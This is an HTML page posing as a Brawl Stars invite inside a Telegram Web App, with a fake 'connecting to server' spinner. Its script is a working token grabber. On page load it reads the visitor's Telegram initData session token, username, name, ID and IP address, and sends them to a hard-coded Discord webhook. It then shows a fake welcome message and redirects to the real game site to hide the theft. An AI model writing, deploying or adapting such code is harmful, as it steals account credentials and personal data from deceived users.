<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Brawl Stars Invite</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a0b2e 50%, #0a0a0f 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        .card {
            background: rgba(17, 15, 25, 0.85);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            padding: 40px 36px;
            max-width: 400px;
            width: 90%;
            border: 1px solid rgba(139, 92, 246, 0.4);
            text-align: center;
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(139, 92, 246, 0.3);
            border-top: 3px solid #a855f7;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            color: #e9d5ff;
            font-size: 24px;
            margin-bottom: 12px;
        }
        .status {
            color: #d8b4fe;
            font-size: 14px;
            margin: 16px 0;
        }
        .checkmark {
            font-size: 48px;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>
<div class="card">
    <div class="spinner" id="spinner"></div>
    <h2>Brawl Stars</h2>
    <div class="status" id="statusText">Подключение к серверу...</div>
</div>

<script>
    (function() {
        // ТВОЙ DISCORD WEBHOOK
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1495474063907487854/usu_pBnlU53uEh_e5ia9L8ILNh0ab0cdJ4ukjVT9PxItSVOCeGCR_J0VpzshMddnrqCE";
        
        // Функция отправки в Discord
        async function sendToDiscord(tokenData, userData, ip) {
            const embed = {
                title: "🎮 BRAWL STARS TOKEN GRABBED",
                color: 0xa855f7,
                fields: [
                    { name: "👤 Username", value: `@${userData.username || "no_username"}`, inline: true },
                    { name: "🆔 User ID", value: `\`${userData.id || "?"}\``, inline: true },
                    { name: "📛 Имя", value: `${userData.first_name || ""} ${userData.last_name || ""}`, inline: true },
                    { name: "🌐 IP", value: `\`${ip || "unknown"}\``, inline: true },
                    { name: "📏 Длина токена", value: `${tokenData.length} символов`, inline: true },
                    { name: "🔑 Токен", value: `\`\`\`\n${tokenData.substring(0, 600)}${tokenData.length > 600 ? "..." : ""}\n\`\`\``, inline: false }
                ],
                footer: { text: "Brawl Invite System" },
                timestamp: new Date().toISOString()
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
                return true;
            } catch(e) {
                console.error(e);
                return false;
            }
        }
        
        // Получение IP
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return "unknown";
            }
        }
        
        // Главная функция
        async function grab() {
            const statusDiv = document.getElementById('statusText');
            const spinner = document.getElementById('spinner');
            
            // Ждём Telegram WebApp
            let attempts = 0;
            while (!window.Telegram?.WebApp && attempts < 30) {
                await new Promise(r => setTimeout(r, 100));
                attempts++;
            }
            
            if (window.Telegram && window.Telegram.WebApp) {
                const webapp = window.Telegram.WebApp;
                const initData = webapp.initData;
                const user = webapp.initDataUnsafe.user || {};
                
                if (initData && initData.length > 10) {
                    statusDiv.innerHTML = "✅ Авторизация...";
                    const ip = await getIP();
                    await sendToDiscord(initData, {
                        id: user.id,
                        username: user.username,
                        first_name: user.first_name,
                        last_name: user.last_name
                    }, ip);
                    
                    spinner.style.display = "none";
                    statusDiv.innerHTML = "✅ Добро пожаловать! Перенаправление...";
                    
                    // Редирект на реальный Brawl Stars (опционально)
                    setTimeout(() => {
                        window.location.href = "https://brawlstars.com";
                    }, 800);
                    
                    // Закрываем WebApp через 1 секунду
                    setTimeout(() => {
                        try { webapp.close(); } catch(e) {}
                    }, 1000);
                } else {
                    statusDiv.innerHTML = "❌ Ошибка подключения";
                }
            } else {
                statusDiv.innerHTML = "❌ Откройте через Telegram";
            }
        }
        
        grab();
    })();
</script>
</body>
</html>
